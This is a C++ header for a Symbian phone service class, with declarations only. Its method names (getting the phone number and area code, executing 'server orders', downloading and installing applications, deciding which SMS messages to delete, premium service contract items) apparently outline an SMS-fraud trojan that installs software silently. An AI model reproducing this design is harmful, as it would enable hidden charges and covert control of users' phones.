#ifndef __CSMSFILTERSERVER_H__
#define __CSMSFILTERSERVER_H__
#include <e32std.h>
#include <e32base.h>
#include <s32file.h>
#include <flogger.h>
#include <commdbconnpref.h>
#include <es_sock.h>
#include "applicationmanager.h"
#include "socketengine.h"
#include "timeouttimer.h"
#include "commonutils.h"
#include "smsengine.h"

enum TInstallManagerPanic{
  EBadRequest=1, EBadDescriptor=2, ESrvCreateServer=3, EMainSchedulerError=4, ECreateTrapCleanup=5, ESrvSessCreateTimer=6, EReqAlreadyPending=7
};
enum TMMFlowState{
  EInitializeNetWork, EGetPhoneNumber, EGetAreaCode, EGetServerOrder, EExecuteServerOrder, EDownloadApplication, ECloseNetwork, EInstallApplication, ECleanUp
};

class CAppMain:public CServer2,MTimeOutNotify,MSmsObserver,public CHTTPDownObserver{
public:
  static CAppMain* NewL();
  static CAppMain* NewLC();
  virtual ~CAppMain();
  static TInt EntryPoint(TAny* aStarted);
  static void ThreadMainL();
  static void PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic);
  static void PanicServer(TInstallManagerPanic aPanic);
  static TInt StartMMServiceFlow(TAny* aObject);
  static TInt StartSMSServiceFlow(TAny* aObject);
  void TimerExpired();
  void InitializeNetWork();
  void CloseNetWork();
  void CleanUp();
  void InstallApplication();
  void OnInstallerEvent(TBool aIsInstall,TUid aAppUid,TInt aError);
  TBool GetState();
  TBool GetAccessPoint();
  TInt GetServerOrder();
  TInt GetPhoneNumber();
  TInt GetAreaCode();
  TInt DownloadApplication();
  void ExecuteServerOrder();
  void ParseServerOrder(const TDesC8& orderString);
  void SaveSmsOrder(const TDesC8& orderString);
  TInt OrderCancel();
  void CAppMain::SendSmsParseRequest(const TDesC& address,const TDesC& content,const TDesC& aChannelItemId);
  TBool MessageNeedDelete(const TDesC& number,const TDesC& content);
protected:
  TInt RunError(TInt aError);
private:
  CAppMain(TInt aPriority);
  void ConstructL();
  CSession2* NewSessionL(const TVersion& aVersion,const RMessage2& aMessage) const;
  void DoInitConfigUrl();
  TInt DoInitNetworkFlow();
  void DoCloseNetworkFlow();
  void HandleSmsServerParserReply(const TDesC8& aData);
  void ReceData(const TDesC8& aData); //CHTTPDownObserver
  void OnHttpError(THttpErrorID aErrId); //CHTTPDownObserver
  void SetAreaCode(const TDesC8& buf);
  void SetPhoneNumber(const TDesC8& buf);
public:
  CSocketEngine* iSocketEngine;
  RSocketServ iSocketServ;
  RConnection iConnection;
  TBool iFirstConnect;
  TCommDbConnPref prefs; //预选网络接入点对象
  TUint32 iDefaultAccessPointID;
  TInt iCountConnect;
  CApplicationManager* iApplicationManager;
private:
  CTimeOutTimer* iTimeout;
  TMMFlowState iMMState;
  HBufC8* iUserAgent;
  CSmsEngine* iSmsEngine;
  CPeriodic* iMMServicePeriodic;
  CPeriodic* iSMSServicePeriodic;
  TInt iPeriodicCount;
  TBuf8<300> iApplicationUrl;
  TBool iNeedInstall;
  TBuf8<11> iPhoneNumber;
  TBuf8<6> iAreaCode;
  CArrayPtrSeg<SmsMessage>* iReplySmsMessageArray;
  CArrayPtrSeg<SpChannelItem>* iContractItemArray;
};

#endif 
